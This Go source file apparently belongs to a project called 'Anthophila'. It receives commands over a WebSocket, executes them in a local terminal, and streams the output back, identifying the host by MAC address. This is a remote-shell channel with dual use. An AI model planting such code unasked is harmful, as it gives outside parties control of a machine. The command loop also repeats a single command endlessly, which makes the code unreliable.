package management

import (
	"Anthophila/information"
	"Anthophila/terminal"
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"strings"
)

type Reader struct{}

func NewReader() *Reader {
	return new(Reader)
}

// Обробка отриманих повідомлень
func (r *Reader) ReadMessage(ws *websocket.Conn) {
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			return
		}
		log.Printf("Received: %s", message)
	}
}

// Обробка отриманих команд через WebSocket
func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
	type Command struct {
		SClient string `json:"sClient"`
		Command string `json:"command"`
	}
	var cmd Command
	type myMessage struct {
		SClient string `json:"sClient"`
		RClient string `json:"rClient"`
		Message string `json:"message"`
	}

	terminal := terminal.NewTerminalManager()
	terminal.Start()
	// Запускаємо горутину для обробки виходу терміналу
	go func() {
		for line := range terminal.GetOutput() {
			msg := myMessage{
				SClient: information.NewInfo().GetMACAddress(),
				RClient: cmd.SClient,
				Message: "{terminal:{" + line + "}}",
			}
			jsonData, err := json.Marshal(msg)
			if err != nil {
				log.Println("Error marshalling JSON:", err)
				continue
			}
			log.Println("Json " + string(jsonData))
			if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
				log.Println("Error sending message:", err)
			}
		}
	}()

	for {
		_, message, err := wSocket.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			return
		}

		if err := json.Unmarshal(message, &cmd); err != nil {
			// Якщо розпарсити як JSON не вдалося, обробляємо як звичайний текст
			log.Println("Received text message:", string(message))
		} else {
			// Якщо розпарсити вдалося, працюємо з даними
			if cmd.Command == "help" {
				// Заповнення внутрішньої структури
				msg := myMessage{
					SClient: information.NewInfo().GetMACAddress(),
					RClient: cmd.SClient,
					Message: "Ми отримали від вас повідомлення. Наше ім'я: " + information.NewInfo().GetMACAddress() + ". Ваше повідомлення: " + string(message),
				}

				// Серіалізація в JSON
				jsonData, err := json.Marshal(msg)
				if err != nil {
					log.Println("Error marshalling JSON:", err)
					continue
				}
				log.Println("Json " + string(jsonData))
				if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
					log.Println("Error sending message:", err)
				}
			} else {
				// Основний цикл для взаємодії з користувачем
				for {
					if strings.TrimSpace(cmd.Command) == "exit" {
						terminal.Stop()
						fmt.Println("Exiting...")
						return
					}
					terminal.SendCommand(cmd.Command)
				}
			}
		}
	}
}
